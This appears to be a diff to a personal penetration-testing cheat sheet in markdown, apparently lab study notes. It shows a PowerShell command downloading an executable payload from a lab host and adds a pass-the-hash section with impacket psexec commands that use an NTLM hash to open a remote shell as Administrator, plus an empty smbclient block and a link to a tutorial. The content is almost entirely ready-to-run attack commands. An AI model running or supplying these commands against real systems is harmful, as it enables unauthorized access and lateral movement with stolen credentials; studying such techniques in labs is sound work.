@@ -10,3 +10,16 @@ PowerShell:
 ```
 iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
 ```
+# Pass The Hash
+## psexec.py
+```
+impacket-psexec -hashes 00000000000000000000000000000000:<NTLM> <user>@<ip>
+```
+```
+python psexec.py -hashes 00000000000000000000000000000000:<NTLM> Administrator@192.168.1.105
+```
+## smbclient.py
+```
+
+```
+[HINT](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/)
